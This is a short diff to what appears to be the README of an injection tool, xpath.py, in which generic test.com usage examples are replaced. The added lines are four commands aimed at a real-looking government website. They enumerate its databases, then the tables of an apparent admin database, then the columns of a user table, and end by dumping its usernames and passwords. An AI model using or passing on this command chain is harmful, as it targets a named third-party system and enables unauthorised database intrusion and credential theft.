@@ -64,8 +64,10 @@ Options:
     -T TBL             DBMS database tables(s) to enumerate
     -C COL             DBMS database table column(s) to enumerate
   Example:
-    xpath.py -u http://www.test.com/index.php?id=1 --dbs<br />
-    xpath.py -u http://www.test.com/ --data "index.php?id=1" --dbs
+python xpath.py -u http://www.bpc.gov.bd/contactus.php?id=1 --dbs
+python xpath.py -u http://www.bpc.gov.bd/contactus.php?id=1 -D bpcadmin_bpc --tables
+python xpath.py -u http://www.bpc.gov.bd/contactus.php?id=1 -D bpcadmin_bpc -T tbl_user --columns
+python xpath.py -u http://www.bpc.gov.bd/contactus.php?id=1 -D bpcadmin_bpc -T tbl_user -C username,password --dump
   </code></pre>
 ### Legal disclaimer
 
